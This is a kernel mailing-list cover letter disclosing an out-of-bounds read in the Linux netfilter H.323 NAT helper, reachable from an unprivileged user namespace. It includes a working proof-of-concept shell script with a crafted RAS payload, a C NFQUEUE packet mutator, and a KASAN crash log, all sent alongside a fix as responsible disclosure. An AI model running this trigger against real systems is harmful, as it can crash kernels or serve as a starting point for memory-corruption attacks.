Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7BAFF42B73B
	for <netfilter-devel@vger.kernel.org>; Mon, 27 Jul 2026 17:58:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785175116; cv=none; b=lPh5IY/l76CLbIqy7K2HZb3nQlAy+7Jn8FIVyXktgFlqVKAGXfY0ztVHTG/gBnt3NwDC65JPwvx2gmyEX8aGj+fBGtXzKaVJU8S+T9icnYrYtlnl3K++WhrFdW2NaEpPCC8ukUNt3ucsTA51N3Pbjfa8L0g5EbK6ddmOG+BVUOo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785175116; c=relaxed/simple;
	bh=LhyU1ZDy2vG0+yEy4nGj3SIpQGyzkUTjB7J52DnBpjQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=sCk6jLaXa+LiXmY1YJKV1yxnmtmTFuDOeBhkCCOFTHF89Z+P13N95WoB+JBa+HYd62eW538hHGHZIbCiUUsduQwNm02FmJOaQUpKChVPjMd2Eyxz9/cdqxZJvVxpcDGe3/c60rTE60pHZkYK7NPMOSEux+hiK81z4Zfj+zNTYwI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=N72K/Kg5; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="N72K/Kg5"
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-8487214ad2bso4088140b3a.1
        for <netfilter-devel@vger.kernel.org>; Mon, 27 Jul 2026 10:58:31 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785175110; x=1785779910; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=1r/vSzznj1BiosqBN6nVcp/0fMsY4O6GZJGTGSlGjtQ=;
        b=N72K/Kg5rpbjbyecvc+Aow2obibAdtzeYD1jPat9VS5QIc0aLJGcHjIlM12K3EgC4m
         Y5jwFd/SJyjj32HZ6A827YeLIriBMNevxpEzvbiyZNgu27alDrEvPFkTWvvkDbn45O+f
         V7zTObGI/+Ff/uFYYT9vhi7WEd6oBAlMM5I0NAdpeZaIedLxTyXAjQaKisKjXMtQx9NN
         u3kkCb/UOyWJQSrr/2iGy1FTTj4wOXkKLUUR1p+oRZhu+gPmFN9S4Rm6g8wDgzGtEP4X
         siBh9jjKb8dqmtPm8aRxM084lpkYhMOxdtg2Hg81dG5ATBfGave5nFHv2psW/YAf2SiI
         kOLg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785175110; x=1785779910;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=1r/vSzznj1BiosqBN6nVcp/0fMsY4O6GZJGTGSlGjtQ=;
        b=O1iTabDncUhWdIJpglSYyQsiMidMQ4Pw3TPyQVvkmjYXEMuC34ggXifxe6eYzjOVMh
         zb/zx6TfWqx/98tYuHhd7Im8/IOAIL+We08ABSCg0BwzEobieT9G6LD6vJGzPXo/+7os
         1EtCr40WkI4lvj8Cp583Lix1jvUHJbJY8FUxwK6KY0HukJqziZj602kE6K44jtGuPXos
         Okr803Y5isYcqtr3Vp6kRneOVbSy/LLnF7dpWFEc+GHn/39i++LQUthoz7tdfx607b6U
         HF1WchNZz2uMaWaX9NuKVrtIwa4jt9pB5YH6ifVAMx+nFE94yT6LLpQEAKnFnkUDr7H6
         VOSA==
X-Gm-Message-State: AOJu0YxvwKIeJpPbWtfXu4zp2SkHl/FOdMUX6ScKYarUXdXAqHyiLW1f
	iQhm7EUwRMbasXtZaxZXkSk0TT/d8C0R5sj4xXGESV3c3UUNBPA1VlxHJb14zGeeLnU9rA==
X-Gm-Gg: AR+sD11AqUP7PiWTEjMHlNymHPWGN/+85RKvCWFZRvqQ8ZfspypZ3XyjlS0Z+FIfUrU
	sL/+Ci1gmhFBd6wJe/+mz+W+llH+towiRrvWUi7aIL2N2bIt3u5Tb+tD2CDE1EXHO7/j4kZu55x
	T+mdb3H3QwLllIHA8lzcQeO8JTKL9ZrO7agYqMowRwEqDl/bOkhasoaXTIiCS4RP/H34KGFm65Q
	+Gcq1D0ckZ4/R2A6Byh+HNq5v02d1ctMNY3V+uk7aLgc/Jd3Ne8yeFoGUM73uxYgsAie/PK5ybb
	oV+/Y2iD4s8k6YNFunYM9ZW0LQ6Pw1C7eZ/HhBzBLcqfR+YKcHc3Rh6hLLztp2XxBUWjCT238pJ
	NJO4kpT4r05/8+krBfUAy2K4raS0U/1l9vRxScKTbNYgL6lFCFN+kblWFp0u5oKqTGmq+4VBxUW
	+3DdHoJfZWNEZGVxsyuWs7
X-Received: by 2002:a05:6a00:a586:b0:845:e105:1e6b with SMTP id d2e1a72fcca58-84e5959dc7emr8216567b3a.62.1785175109917;
        Mon, 27 Jul 2026 10:58:29 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e53418f58sm3391117b3a.40.2026.07.27.10.58.26
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 10:58:29 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	zhaojignmin@hotmail.com,
	kaber@trash.net,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH nf 0/1] netfilter: h323: fix helper NAT mangling
Date: Tue, 28 Jul 2026 01:58:22 +0800
Message-ID: <cover.1785133455.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/netfilter/nf_nat_h323.c and
net/netfilter/nf_conntrack_h323_main.c. The bug is reachable by a
non-root user after creating user and net namespaces with namespace-local
CAP_NET_ADMIN.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

H.323 conntrack helpers parse packet payloads according to the helper
that is attached to the conntrack entry. RAS parses UDP payloads, while
Q.931 and H.245 parse TPKT data from TCP payloads.

The NAT helper later calls set_addr() to rewrite addresses embedded in
those helper payloads. Before this fix, set_addr() chose
nf_nat_mangle_tcp_packet() or nf_nat_mangle_udp_packet() from the
packet's current IPv4 protocol byte. A namespace-local packet modifier
can rewrite that byte after conntrack has accepted the original layout
and before helper processing at the confirm hook.

This makes the parser and NAT mangler use different transport-header
bases. The PoC attaches the RAS helper to a UDP conntrack, queues the
packet, changes the IPv4 protocol byte to TCP, and reinjects it.
ras_help() still parses the address relative to the UDP payload, but
set_addr() uses the TCP mangler and a forged TCP data offset. The NAT
match offset then points past skb->tail and KASAN reports an
out-of-bounds access in mangle_contents().

There is a second edge case on the H.245 helper path. The H.245 helper
is registered with IPPROTO_UDP, but h245_help() parses TPKT/TCP data and
uses the TCP doff as its base. Userspace can bind the registered H.245
helper to a UDP conntrack with nftables. If NAT then selected the mangler
only from the UDP tuple, the same parser/mangler base mismatch would
remain reachable.

The fix selects the NAT mangler from nf_ct_protonum(ct), the stable
protocol stored in the conntrack tuple, instead of the mutable IPv4
protocol byte. It also ignores H.245 helper invocations on non-TCP
conntracks before the TCP parser can feed offsets to NAT.

Reproducer:

    ./poc.sh

For user namespace reproduction:

    unshare -Urn sh -c '
      cd /path/to/reproducer &&
      ./poc.sh
    '

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
IPT=${IPT:-/usr/sbin/iptables-legacy}
IP=${IP:-/usr/sbin/ip}
XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-${DIR}/xtables.lock}
export XTABLES_LOCKFILE
QUEUE_NUM=${QUEUE_NUM:-0}
SRC_IP=${SRC_IP:-10.0.0.1}
NAT_IP=${NAT_IP:-10.0.0.3}
DST_IP=${DST_IP:-10.0.0.2}
SRC_PORT=${SRC_PORT:-40000}
DST_PORT=${DST_PORT:-1719}
DEV=${DEV:-tun0}
NFQ_PID=

cleanup() {
	if [ -n "${NFQ_PID}" ]; then
		kill "${NFQ_PID}" 2>/dev/null || true
		wait "${NFQ_PID}" 2>/dev/null || true
	fi
	${IPT} -t raw -D OUTPUT -p udp --dport "${DST_PORT}" -j CT --helper RAS 2>/dev/null || true
	${IPT} -t mangle -D OUTPUT -p udp --dport "${DST_PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}" 2>/dev/null || true
	${IPT} -t nat -D POSTROUTING -o "${DEV}" -j SNAT --to-source "${NAT_IP}" 2>/dev/null || true
	${IP} link del "${DEV}" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

if [ "$(id -u)" != "0" ]; then
	echo "run as root or as uid 0 inside a user namespace" >&2
	exit 1
fi

${IP} link del "${DEV}" 2>/dev/null || true
${IP} tuntap add dev "${DEV}" mode tun user root
${IP} addr add "${SRC_IP}/24" dev "${DEV}"
${IP} addr add "${NAT_IP}/24" dev "${DEV}"
${IP} link set "${DEV}" up
${IP} route replace "${DST_IP}/32" dev "${DEV}"

${IPT} -t raw -A OUTPUT -p udp --dport "${DST_PORT}" -j CT --helper RAS
${IPT} -t mangle -A OUTPUT -p udp --dport "${DST_PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}"
${IPT} -t nat -A POSTROUTING -o "${DEV}" -j SNAT --to-source "${NAT_IP}"

"${DIR}/nfq_mutate" "${QUEUE_NUM}" &
NFQ_PID=$!
sleep 1

python3 - <<'PY'
from ipaddress import IPv4Address
import os
import socket

src_ip = os.environ.get("SRC_IP", "10.0.0.1")
dst_ip = os.environ.get("DST_IP", "10.0.0.2")
src_port = int(os.environ.get("SRC_PORT", "40000"))
dst_port = int(os.environ.get("DST_PORT", "1719"))

class BW:
    def __init__(self):
        self.bits = []

    def bit(self, value):
        self.bits.append(1 if value else 0)

    def bitsv(self, value, nbits):
        for shift in range(nbits - 1, -1, -1):
            self.bits.append((value >> shift) & 1)

    def align(self):
        while len(self.bits) % 8:
            self.bits.append(0)

    def bytes(self, data):
        self.align()
        for byte in data:
            self.bitsv(byte, 8)

    def out(self):
        self.align()
        out = bytearray()
        for i in range(0, len(self.bits), 8):
            value = 0
            for bit in self.bits[i:i + 8]:
                value = (value << 1) | bit
            out.append(value)
        return bytes(out)

bw = BW()

# RasMessage ::= locationRequest
bw.bit(0)
bw.bitsv(18, 5)

# LocationRequest root: endpointIdentifier present, nonStandardData absent.
bw.bit(0)
bw.bitsv(0b10, 2)
bw.align()

# requestSeqNum
bw.bytes((1).to_bytes(2, "big"))

# endpointIdentifier: 121 UTF-16 code units. Byte 4 becomes 0xf0, which the
# later TCP interpretation uses as a fake data offset.
bw.bitsv(120, 7)
bw.align()
bw.bytes(b"A\x00" * 121)

# destinationInfo: empty
bw.align()
bw.bytes(b"\x00")

# replyAddress ::= ipAddress { ip, port }
bw.bit(0)
bw.bitsv(0, 3)
bw.align()
bw.bytes(IPv4Address(src_ip).packed)
bw.align()
bw.bytes(src_port.to_bytes(2, "big"))

payload = bw.out()
print(f"payload_len={len(payload)} payload4={payload[4]:#x}")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((src_ip, src_port))
s.sendto(payload, (dst_ip, dst_port))
PY

wait "${NFQ_PID}"

------END poc.sh--------

------BEGIN nfq_mutate.c------

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <libmnl/libmnl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_queue.h>
#include <netinet/ip.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct queued_pkt {
	uint32_t id;
	uint8_t *payload;
	uint32_t payload_len;
	bool ready;
};

static uint16_t ip_checksum(void *buf, size_t len)
{
	uint32_t sum = 0;
	uint16_t *p = buf;

	while (len > 1) {
		sum += *p++;
		len -= 2;
	}
	if (len)
		sum += *(uint8_t *)p;
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return ~sum;
}

static int parse_attr_cb(const struct nlattr *attr, void *data)
{
	const struct nlattr **tb = data;
	int type = mnl_attr_get_type(attr);

	if (mnl_attr_type_valid(attr, NFQA_MAX) < 0)
		return MNL_CB_OK;

	switch (type) {
	case NFQA_PACKET_HDR:
		if (mnl_attr_validate2(attr, MNL_TYPE_UNSPEC,
				       sizeof(struct nfqnl_msg_packet_hdr)) < 0)
			return MNL_CB_ERROR;
		break;
	case NFQA_PAYLOAD:
		break;
	default:
		break;
	}

	tb[type] = attr;
	return MNL_CB_OK;
}

static int queue_cb(const struct nlmsghdr *nlh, void *data)
{
	const struct nlattr *tb[NFQA_MAX + 1] = {};
	const struct nfqnl_msg_packet_hdr *ph;
	struct queued_pkt *pkt = data;

	mnl_attr_parse(nlh, sizeof(struct nfgenmsg), parse_attr_cb, (void *)tb);
	if (!tb[NFQA_PACKET_HDR] || !tb[NFQA_PAYLOAD])
		return MNL_CB_ERROR;

	ph = mnl_attr_get_payload(tb[NFQA_PACKET_HDR]);
	pkt->id = ntohl(ph->packet_id);
	pkt->payload_len = mnl_attr_get_payload_len(tb[NFQA_PAYLOAD]);
	pkt->payload = malloc(pkt->payload_len);
	if (!pkt->payload) {
		perror("malloc");
		exit(1);
	}
	memcpy(pkt->payload, mnl_attr_get_payload(tb[NFQA_PAYLOAD]),
	       pkt->payload_len);
	pkt->ready = true;
	return MNL_CB_STOP;
}

static struct nlmsghdr *build_cfg_pf_request(char *buf, uint8_t command)
{
	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
	struct nfgenmsg *nfg;
	struct nfqnl_msg_config_cmd cmd = {
		.command = command,
		.pf = htons(AF_INET),
	};

	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	mnl_attr_put(nlh, NFQA_CFG_CMD, sizeof(cmd), &cmd);
	return nlh;
}

static struct nlmsghdr *build_cfg_request(char *buf, uint8_t command,
					  uint16_t queue_num)
{
	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
	struct nfgenmsg *nfg;
	struct nfqnl_msg_config_cmd cmd = {
		.command = command,
		.pf = htons(AF_INET),
	};

	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(queue_num);
	mnl_attr_put(nlh, NFQA_CFG_CMD, sizeof(cmd), &cmd);
	return nlh;
}

static struct nlmsghdr *build_cfg_params(char *buf, uint8_t mode, int range,
					 uint16_t queue_num)
{
	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
	struct nfgenmsg *nfg;
	struct nfqnl_msg_config_params params = {
		.copy_range = htonl(range),
		.copy_mode = mode,
	};

	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(queue_num);
	mnl_attr_put(nlh, NFQA_CFG_PARAMS, sizeof(params), &params);
	return nlh;
}

static struct nlmsghdr *build_verdict(char *buf, const struct queued_pkt *pkt,
				      uint16_t queue_num, uint32_t verdict)
{
	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
	struct nfgenmsg *nfg;
	struct nfqnl_msg_verdict_hdr vh = {
		.verdict = htonl(verdict),
		.id = htonl(pkt->id),
	};

	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_VERDICT;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(queue_num);
	mnl_attr_put(nlh, NFQA_VERDICT_HDR, sizeof(vh), &vh);
	mnl_attr_put(nlh, NFQA_PAYLOAD, pkt->payload_len, pkt->payload);
	return nlh;
}

static void mutate_packet(struct queued_pkt *pkt)
{
	struct iphdr *iph;
	uint8_t *l4;

	if (pkt->payload_len < sizeof(*iph))
		return;

	iph = (struct iphdr *)pkt->payload;
	if (iph->version != 4 || iph->ihl < 5)
		return;
	if (pkt->payload_len < iph->ihl * 4U + 13)
		return;

	l4 = pkt->payload + iph->ihl * 4U;
	fprintf(stderr,
		"nfqueue: id=%u len=%u old_proto=%u doff_byte_before=%#x\n",
		pkt->id, pkt->payload_len, iph->protocol, l4[12]);

	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->check = ip_checksum(iph, iph->ihl * 4U);

	fprintf(stderr,
		"nfqueue: id=%u new_proto=%u doff_byte_after=%#x\n",
		pkt->id, iph->protocol, l4[12]);
}

int main(int argc, char **argv)
{
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	struct queued_pkt pkt = {};
	unsigned int portid;
	uint16_t queue_num = 0;
	int ret;

	if (argc > 1)
		queue_num = (uint16_t)atoi(argv[1]);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (!nl) {
		perror("mnl_socket_open");
		return 1;
	}

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		return 1;
	}
	portid = mnl_socket_get_portid(nl);

	nlh = build_cfg_pf_request(buf, NFQNL_CFG_CMD_PF_UNBIND);
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
		perror("PF_UNBIND");

	nlh = build_cfg_pf_request(buf, NFQNL_CFG_CMD_PF_BIND);
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror("PF_BIND");
		return 1;
	}

	nlh = build_cfg_request(buf, NFQNL_CFG_CMD_BIND, queue_num);
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror("QUEUE_BIND");
		return 1;
	}

	nlh = build_cfg_params(buf, NFQNL_COPY_PACKET, 0xffff, queue_num);
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror("CFG_PARAMS");
		return 1;
	}

	for (;;) {
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
		if (ret < 0) {
			perror("mnl_socket_recvfrom");
			return 1;
		}
		ret = mnl_cb_run(buf, ret, 0, portid, queue_cb, &pkt);
		if (ret < 0) {
			perror("mnl_cb_run");
			return 1;
		}
		if (!pkt.ready)
			continue;

		mutate_packet(&pkt);
		nlh = build_verdict(buf, &pkt, queue_num, NF_ACCEPT);
		if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
			perror("send verdict");
			return 1;
		}
		free(pkt.payload);
		break;
	}

	mnl_socket_close(nl);
	return 0;
}

------END nfq_mutate.c--------

----BEGIN crash log----

[  142.557736] [   T1073] BUG: KASAN: out-of-bounds in mangle_contents (../net/netfilter/nf_nat_helper.c:38:2)
[  142.557790] [   T1073] Read of size 18446744073709551564 at addr ffff88810fc8ee9f by task nfq_mutate/1073

[  142.557839] [   T1073] CPU: 1 UID: 1028 PID: 1073 Comm: nfq_mutate Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  142.557860] [   T1073] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  142.557871] [   T1073] Call Trace:
[  142.557885] [   T1073]  <TASK>
[  142.557895] [   T1073]  dump_stack_lvl (../lib/dump_stack.c:118:3)
[  142.557963] [   T1073]  print_report (../include/linux/mm.h:1903:22 ../mm/kasan/report.c:289:10 ../mm/kasan/report.c:376:22 ../mm/kasan/report.c:482:3)
[  142.558014] [   T1073]  ? mangle_contents (../net/netfilter/nf_nat_helper.c:38:2)
[  142.558102] [   T1073]  kasan_report (../mm/kasan/report.c:593:2)
[  142.558133] [   T1073]  kasan_check_range (../mm/kasan/generic.c:183:10 ../mm/kasan/generic.c:200:9)
[  142.558145] [   T1073]  __asan_memmove (../mm/kasan/shadow.c:94:7)
[  142.558163] [   T1073]  mangle_contents (../net/netfilter/nf_nat_helper.c:38:2)
[  142.558192] [   T1073]  __nf_nat_mangle_tcp_packet (../net/netfilter/nf_nat_helper.c:106:20)
[  142.558209] [   T1073]  set_addr (../net/ipv4/netfilter/nf_nat_h323.c:26:1)
[  142.558316] [   T1073]  set_ras_addr (../net/ipv4/netfilter/nf_nat_h323.c:166:18)
[  142.558379] [   T1073]  ras_help (../net/netfilter/nf_conntrack_h323_main.c:1675:2)
[  142.558565] [   T1073]  nf_confirm (../include/linux/skbuff.h:3130:24 ../include/linux/ipv6.h:110:27 ../net/netfilter/nf_conntrack_proto.c:160:10)
[  142.558728] [   T1073]  nfqnl_reinject (../include/linux/bitops.h:126:32 ../include/linux/jhash.h:139:3 ../include/linux/rhashtable.h:143:11 ../include/linux/rhashtable.h:153:22 ../include/linux/rhashtable.h:168:9 ../include/linux/rhashtable.h:1058:9 ../include/linux/rhashtable.h:1144:16 ../include/linux/rhashtable.h:1173:9 ../net/netfilter/nfnetlink_queue.c:236:2)
[  142.558746] [   T1073]  nfqnl_recv_verdict (../net/netfilter/nfnetlink_queue.c:1539:6)
[  142.559195] [   T1073]  netlink_unicast (../include/net/net_namespace.h:419:9 ../include/net/sock.h:713:9 ../net/netlink/af_netlink.c:1260:2 ../net/netlink/af_netlink.c:1269:12 ../net/netlink/af_netlink.c:1359:9)
[  142.559272] [   T1073]  netlink_sendmsg (../net/netlink/af_netlink.c:1875:24)
[  142.559350] [   T1073]  __sys_sendto (../net/socket.c:790:2 ../net/socket.c:802:16 ../net/socket.c:2265:9)
[  142.559478] [   T1073]  __x64_sys_sendto (../net/socket.c:2272:9 ../net/socket.c:2268:1 ../net/socket.c:2268:1)
[  142.559530] [   T1073]  do_syscall_64 (../arch/x86/include/asm/entry-common.h:43:3 ../include/linux/irq-entry-common.h:100:2 ../include/linux/entry-common.h:174:2 ../arch/x86/entry/syscall_64.c:89:7)
[  142.559542] [   T1073]  entry_SYSCALL_64_after_hwframe (../arch/x86/entry/entry_64.S:121)
[  142.559645] [   T1073]  </TASK>

[  142.559796] [   T1073] Allocated by task 1076 on cpu 3 at 142.556120s:
[  142.559809] [   T1073]  kasan_save_stack (../mm/kasan/common.c:57:15)
[  142.559833] [   T1073]  __kasan_slab_alloc (../mm/kasan/common.c:352:5)
[  142.559844] [   T1073]  kmem_cache_alloc_node_noprof (../mm/slub.c:4756:5 ../mm/slub.c:4883:11 ../mm/slub.c:4950:14)
[  142.559876] [   T1073]  kmalloc_reserve (../net/core/skbuff.c:613:9)
[  142.559892] [   T1073]  __alloc_skb (../net/core/skbuff.c:703:6)
[  142.559905] [   T1073]  alloc_skb_with_frags (../net/core/skbuff.c:6730:6)
[  142.559925] [   T1073]  sock_alloc_send_pskb (../include/net/sock.h:2117:10 ../net/core/sock.c:2959:14 ../net/core/sock.c:2996:11)
[  142.559942] [   T1073]  __ip_append_data (../include/linux/refcount.h:291:3 ../include/linux/refcount.h:312:2 ../net/ipv4/ip_output.c:1277:3)
[  142.559953] [   T1073]  ip_make_skb (../net/ipv4/ip_output.c:1583:1)
[  142.559964] [   T1073]  udp_sendmsg (../include/linux/rcupdate.h:867:2 ../include/net/l3mdev.h:102:3 ../net/ipv4/udp.c:1387:18)

[  142.560041] [   T1073] The buggy address belongs to the object at ffff88810fc8ed40
which belongs to the cache skbuff_small_head of size 704
[  142.560059] [   T1073] The buggy address is located 351 bytes inside of
704-byte region [ffff88810fc8ed40, ffff88810fc8f000)

[  142.560245] [   T1073] Memory state around the buggy address:
[  142.560254] [   T1073]  ffff88810fc8ed80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  142.560264] [   T1073]  ffff88810fc8ee00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  142.560276] [   T1073] >ffff88810fc8ee80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  142.560287] [   T1073]                             ^
[  142.560317] [   T1073]  ffff88810fc8ef00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  142.560327] [   T1073]  ffff88810fc8ef80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  142.560335] [   T1073] ==================================================================
[  142.560397] [   T1073] Disabling lock debugging due to kernel taint

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  netfilter: h323: keep NAT mangling aligned with parsed transport

 net/ipv4/netfilter/nf_nat_h323.c       | 9 +++++++--
 net/netfilter/nf_conntrack_h323_main.c | 4 ++++
 2 files changed, 11 insertions(+), 2 deletions(-)

-- 
2.43.0
